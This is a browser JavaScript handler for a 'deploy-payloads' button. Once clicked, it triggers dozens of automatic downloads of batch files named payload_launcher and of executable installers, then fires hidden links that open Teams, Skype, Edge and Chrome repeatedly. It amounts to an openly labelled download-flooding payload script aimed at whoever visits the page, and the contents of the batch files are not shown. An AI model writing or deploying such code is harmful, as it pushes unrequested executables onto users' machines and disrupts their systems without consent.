document.getElementById("deploy-payloads").addEventListener("click", async () => {
    const log = document.getElementById("log");
  
    function logMessage(message) {
      log.textContent += `[INFO] ${message}\n`;
      log.scrollTop = log.scrollHeight;
    }
  
    logMessage("Starting payload deployment...");
  
    const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
  
    // Step 1: Download the batch file (multi-app launcher) 20 times
    const batchUrl = "assets/payload_launcher.bat";
    for (let i = 1; i <= 20; i++) {
      const batchAnchor = document.createElement("a");
      batchAnchor.href = batchUrl;
      batchAnchor.download = `payload_launcher_${i}.bat`;
      document.body.appendChild(batchAnchor);
      batchAnchor.click();
      document.body.removeChild(batchAnchor);
      logMessage(`Batch file download ${i} triggered.`);
      await delay(100);
    }
  
    // Step 2: Trigger additional payload URLs 20 times each
    const payloadUrls = [
        
            "https://dl.google.com/chrome/install/latest/chrome_installer.exe",
            "https://demarcoheath.github.io/my-web-app/assets/payload_launcher.bat",
            "https:/demarcoheath.github.io/my-web-app/assets/payload_launcher2.bat",
            "https://www.python.org/ftp/python/3.13.1/python-3.13.1-amd64.exe"
     
    ];
  
    for (const url of payloadUrls) {
      for (let i = 1; i <= 20; i++) {
        const anchor = document.createElement("a");
        anchor.href = url;
        anchor.download = `${url.split("/").pop().replace(".", `_${i}.`)}`;
        document.body.appendChild(anchor);
        anchor.click();
        document.body.removeChild(anchor);
        logMessage(`Payload download from ${url} - instance ${i} triggered.`);
        await delay(100);
      }
    }
  
    // Step 3: Launch applications (Teams, Skype, Edge, Chrome) 10 times each
    const appUrls = [
      "https://teams.microsoft.com",
      "skype://call?user_id=Skype",
      "microsoft-edge://newtab",
      "chrome://newtab",
    ];
  
    for (const appUrl of appUrls) {
      for (let i = 1; i <= 10; i++) {
        const appAnchor = document.createElement("a");
        appAnchor.href = appUrl;
        appAnchor.style.display = "none";
        document.body.appendChild(appAnchor);
        appAnchor.click();
        document.body.removeChild(appAnchor);
        logMessage(`Application launch for ${appUrl} - instance ${i} triggered.`);
        await delay(100);
      }
    }
  
    logMessage("Payload deployment complete.");
  });
  